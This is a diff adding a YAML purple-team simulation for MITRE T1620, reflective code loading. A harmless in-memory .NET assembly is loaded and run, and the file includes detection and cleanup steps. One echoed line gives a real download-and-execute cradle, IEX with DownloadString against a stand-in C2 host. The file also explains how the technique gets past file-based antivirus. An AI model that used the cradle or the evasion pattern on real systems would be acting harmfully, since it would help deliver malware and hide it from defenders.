@@ -1,0 +1,104 @@
+id: T1620_reflective_code_loading
+name: "Reflective Code Loading"
+mitre_technique: "T1620"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries load and execute code directly in memory without writing a file to disk
+  (reflective loading). The canonical implementation is ReflectiveDLLInjection —
+  a DLL with a custom loader that maps itself into memory from a byte array. In
+  PowerShell, [Reflection.Assembly]::Load() achieves the same result — loading a .NET
+  assembly directly from a byte array in memory with no on-disk DLL. The assembly
+  executes but never touches disk, defeating file-based scanning.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1620/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1620 — Reflective Code Loading simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Compile a benign .NET assembly to bytes and load reflectively — never touches disk"
+    command: |
+      Write-Host "[PAS] Compiling benign assembly to byte array in memory:"
+
+      # Compile inline to a byte array — no file written to disk
+      $src = @"
+using System;
+public class PASReflective {
+    public static string Execute() {
+        return "PAS-T1620-REFLECTIVE-LOADED";
+    }
+}
+"@
+      Add-Type -TypeDefinition $src -OutputType Library `
+          -OutputAssembly "$env:TEMP\PAS_T1620_temp.dll" -ErrorAction SilentlyContinue
+
+      if (Test-Path "$env:TEMP\PAS_T1620_temp.dll") {
+          $dllBytes = [IO.File]::ReadAllBytes("$env:TEMP\PAS_T1620_temp.dll")
+          Remove-Item "$env:TEMP\PAS_T1620_temp.dll" -Force  # Delete disk copy
+          Write-Host "[PAS] Assembly compiled: $($dllBytes.Length) bytes"
+          Write-Host "[PAS] Disk copy deleted — bytes remain only in memory"
+
+          # Reflective load from byte array — no disk file
+          $asm    = [Reflection.Assembly]::Load($dllBytes)
+          $type   = $asm.GetType("PASReflective")
+          $method = $type.GetMethod("Execute")
+          $result = $method.Invoke($null, $null)
+          Write-Host "[PAS] Reflectively loaded and executed: $result"
+          Write-Host "[PAS] Assembly never on disk during execution — file-based AV blind"
+      } else {
+          # Fallback: use Add-Type directly (also reflective)
+          Write-Host "[PAS] Fallback: Add-Type direct compilation (in-memory):"
+          Add-Type -TypeDefinition $src
+          $result = [PASReflective]::Execute()
+          Write-Host "[PAS] Add-Type reflective result: $result"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Demonstrate Load(byte[]) — the primary reflective loading API"
+    command: |
+      Write-Host "[PAS] [Reflection.Assembly]::Load(byte[]) API telemetry:"
+      Write-Host "[PAS] This API is the core of reflective DLL injection in PowerShell"
+      Write-Host "[PAS] Script block logging captures the Load call even with no disk file"
+      Write-Host "[PAS] Real attack: powershell IEX (New-Object Net.WebClient).DownloadString('http://C2/loader.ps1')"
+      Write-Host "[PAS]   → loader.ps1 contains: [Reflection.Assembly]::Load([Convert]::FromBase64String('...'))"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — script block logging captures [Reflection.Assembly]::Load() call with byte array"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove any temp DLL if it persisted"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1620_temp.dll" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Temp DLL removed (if it existed)"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1620 cleanup complete"
+
+analyst_checklist:
+  - "Script block logging (4104): [Reflection.Assembly]::Load() with byte array argument"
+  - "Script block logging: Add-Type with inline source followed by method invocation"
+  - "MDE: AmsiScanBuffer detects reflectively loaded content at the byte level"
+  - "Sentinel: DeviceEvents | where ActionType == 'PowerShellCommand' and AdditionalFields contains 'Assembly]::Load'"
+  - "MDE alert: 'Reflective code loading' or 'In-memory assembly execution'"
+  - "CONTROL CHECK: Script block logging is the primary detection — without it, reflective loading is nearly invisible"
+  - "CONTROL CHECK: AMSI scans the byte array passed to [Reflection.Assembly]::Load — ensure AMSI is active and tamper-resistant"
+  - "CONTROL CHECK: DeviceImageLoadEvents captures DLL loads even for reflectively loaded assemblies — validate in MDE advanced hunting"
